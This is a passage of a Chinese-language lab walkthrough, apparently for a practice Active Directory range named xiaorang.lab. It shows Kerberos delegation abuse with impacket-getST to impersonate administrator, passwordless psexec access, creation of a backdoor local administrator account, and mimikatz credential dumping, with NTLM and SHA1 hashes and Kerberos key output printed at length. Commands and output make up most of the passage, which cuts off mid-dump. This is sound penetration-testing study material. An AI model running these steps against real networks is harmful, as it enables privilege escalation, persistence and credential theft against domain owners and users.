+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :996a5b076bf2f23b560f69e88ff1243b  xiaorang.lab/XR-Desktop<span class=se>\$</span> -dc-ip 172.22.11.6
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache
+</span></span><span class=line><span class=cl>sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823230643800_hu_a07df1667a0b2e4c.webp width=1024 height=218 srcset="/p/spoofing/image-20260823230643800_hu_d0db668ed62197c5.webp 480w, /p/spoofing/image-20260823230643800_hu_a07df1667a0b2e4c.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823230643800_hu_4e7d0c18fd3cc086.webp data-full-width=1476 data-full-height=314 loading=lazy decoding=async alt=image-20260823230643800 class=gallery-image data-flex-grow=470 data-flex-basis=1128px></p><p><img src=/p/spoofing/image-20260823230833417.png width=316 height=25 data-full-src=/p/spoofing/image-20260823230833417.png data-full-width=316 data-full-height=25 loading=lazy decoding=async alt=image-20260823230833417 class=gallery-image data-flex-grow=1264 data-flex-basis=3033px></p><p>然后就可以psexec无密码连接</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 python psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823231523670_hu_56234a266ad3c43e.webp width=1024 height=401 srcset="/p/spoofing/image-20260823231523670_hu_7b4b958b83267e23.webp 480w, /p/spoofing/image-20260823231523670_hu_56234a266ad3c43e.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823231523670_hu_f397660000c53fc0.webp data-full-width=1260 data-full-height=494 loading=lazy decoding=async alt=image-20260823231523670 class=gallery-image data-flex-grow=255 data-flex-basis=612px></p><p>到这里可以增加管理员用户直接rdp上去了,这里可以看一下用户组</p><p><img src=/p/spoofing/image-20260823231726809_hu_6b015c0e3878c15f.webp width=654 height=403 srcset="/p/spoofing/image-20260823231726809_hu_44b38ae70fdad94a.webp 480w, /p/spoofing/image-20260823231726809_hu_6b015c0e3878c15f.webp 654w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823231726809_hu_6b015c0e3878c15f.webp data-full-width=654 data-full-height=403 loading=lazy decoding=async alt=image-20260823231726809 class=gallery-image data-flex-grow=162 data-flex-basis=389px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>net user <span class=nb>test</span> qwerQ!1234 /add
+</span></span><span class=line><span class=cl>net localgroup administrators <span class=nb>test</span> /add
+</span></span></code></pre></td></tr></table></div></div><p>rdp上去传个猕猴桃，管理员身份运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>privilege::debug
+</span></span><span class=line><span class=cl>sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table></div></div><p>结果如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span><span class=lnt>297
+</span><span class=lnt>298
+</span><span class=lnt>299
+</span><span class=lnt>300
+</span><span class=lnt>301
+</span><span class=lnt>302
+</span><span class=lnt>303
+</span><span class=lnt>304
+</span><span class=lnt>305
+</span><span class=lnt>306
+</span><span class=lnt>307
+</span><span class=lnt>308
+</span><span class=lnt>309
+</span><span class=lnt>310
+</span><span class=lnt>311
+</span><span class=lnt>312
+</span><span class=lnt>313
+</span><span class=lnt>314
+</span><span class=lnt>315
+</span><span class=lnt>316
+</span><span class=lnt>317
+</span><span class=lnt>318
+</span><span class=lnt>319
+</span><span class=lnt>320
+</span><span class=lnt>321
+</span><span class=lnt>322
+</span><span class=lnt>323
+</span><span class=lnt>324
+</span><span class=lnt>325
+</span><span class=lnt>326
+</span><span class=lnt>327
+</span><span class=lnt>328
+</span><span class=lnt>329
+</span><span class=lnt>330
+</span><span class=lnt>331
+</span><span class=lnt>332
+</span><span class=lnt>333
+</span><span class=lnt>334
+</span><span class=lnt>335
+</span><span class=lnt>336
+</span><span class=lnt>337
+</span><span class=lnt>338
+</span><span class=lnt>339
+</span><span class=lnt>340
+</span><span class=lnt>341
+</span><span class=lnt>342
+</span><span class=lnt>343
+</span><span class=lnt>344
+</span><span class=lnt>345
+</span><span class=lnt>346
+</span><span class=lnt>347
+</span><span class=lnt>348
+</span><span class=lnt>349
+</span><span class=lnt>350
+</span><span class=lnt>351
+</span><span class=lnt>352
+</span><span class=lnt>353
+</span><span class=lnt>354
+</span><span class=lnt>355
+</span><span class=lnt>356
+</span><span class=lnt>357
+</span><span class=lnt>358
+</span><span class=lnt>359
+</span><span class=lnt>360
+</span><span class=lnt>361
+</span><span class=lnt>362
+</span><span class=lnt>363
+</span><span class=lnt>364
+</span><span class=lnt>365
+</span><span class=lnt>366
+</span><span class=lnt>367
+</span><span class=lnt>368
+</span><span class=lnt>369
+</span><span class=lnt>370
+</span><span class=lnt>371
+</span><span class=lnt>372
+</span><span class=lnt>373
+</span><span class=lnt>374
+</span><span class=lnt>375
+</span><span class=lnt>376
+</span><span class=lnt>377
+</span><span class=lnt>378
+</span><span class=lnt>379
+</span><span class=lnt>380
+</span><span class=lnt>381
+</span><span class=lnt>382
+</span><span class=lnt>383
+</span><span class=lnt>384
+</span><span class=lnt>385
+</span><span class=lnt>386
+</span><span class=lnt>387
+</span><span class=lnt>388
+</span><span class=lnt>389
+</span><span class=lnt>390
+</span><span class=lnt>391
+</span><span class=lnt>392
+</span><span class=lnt>393
+</span><span class=lnt>394
+</span><span class=lnt>395
+</span><span class=lnt>396
+</span><span class=lnt>397
+</span><span class=lnt>398
+</span><span class=lnt>399
+</span><span class=lnt>400
+</span><span class=lnt>401
+</span><span class=lnt>402
+</span><span class=lnt>403
+</span><span class=lnt>404
+</span><span class=lnt>405
+</span><span class=lnt>406
+</span><span class=lnt>407
+</span><span class=lnt>408
+</span><span class=lnt>409
+</span><span class=lnt>410
+</span><span class=lnt>411
+</span><span class=lnt>412
+</span><span class=lnt>413
+</span><span class=lnt>414
+</span><span class=lnt>415
+</span><span class=lnt>416
+</span><span class=lnt>417
+</span><span class=lnt>418
+</span><span class=lnt>419
+</span><span class=lnt>420
+</span><span class=lnt>421
+</span><span class=lnt>422
+</span><span class=lnt>423
+</span><span class=lnt>424
+</span><span class=lnt>425
+</span><span class=lnt>426
+</span><span class=lnt>427
+</span><span class=lnt>428
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mimikatz <span class=c1># sekurlsa::logonpasswords</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17049641</span> <span class=o>(</span>00000000:01042829<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : RemoteInteractive from <span class=m>3</span>
+</span></span><span class=line><span class=cl>User Name         : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>Domain            : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>Logon Server      : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 23:21:08
+</span></span><span class=line><span class=cl>SID               : S-1-5-21-886837244-2534789743-3500935927-1002
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * NTLM     : faae78d447bfda696dd02b058b9dafd5
+</span></span><span class=line><span class=cl>         * SHA1     : 39a0f771a44df906a303ac2daade2ca8ef5fb718
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17049579</span> <span class=o>(</span>00000000:010427eb<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : RemoteInteractive from <span class=m>3</span>
+</span></span><span class=line><span class=cl>User Name         : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>Domain            : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>Logon Server      : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 23:21:08
+</span></span><span class=line><span class=cl>SID               : S-1-5-21-886837244-2534789743-3500935927-1002
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * NTLM     : faae78d447bfda696dd02b058b9dafd5
+</span></span><span class=line><span class=cl>         * SHA1     : 39a0f771a44df906a303ac2daade2ca8ef5fb718
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : <span class=nb>test</span>
+</span></span><span class=line><span class=cl>         * Domain   : XR-LCM3AE8B
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17024829</span> <span class=o>(</span>00000000:0103c73d<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>3</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-3
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 23:21:07
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-3
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17024592</span> <span class=o>(</span>00000000:0103c650<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>3</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-3
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 23:21:07
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-3
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17022972</span> <span class=o>(</span>00000000:0103bffc<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>3</span>
+</span></span><span class=line><span class=cl>User Name         : UMFD-3
+</span></span><span class=line><span class=cl>Domain            : Font Driver Host
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 23:21:07
+</span></span><span class=line><span class=cl>SID               : S-1-5-96-0-3
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
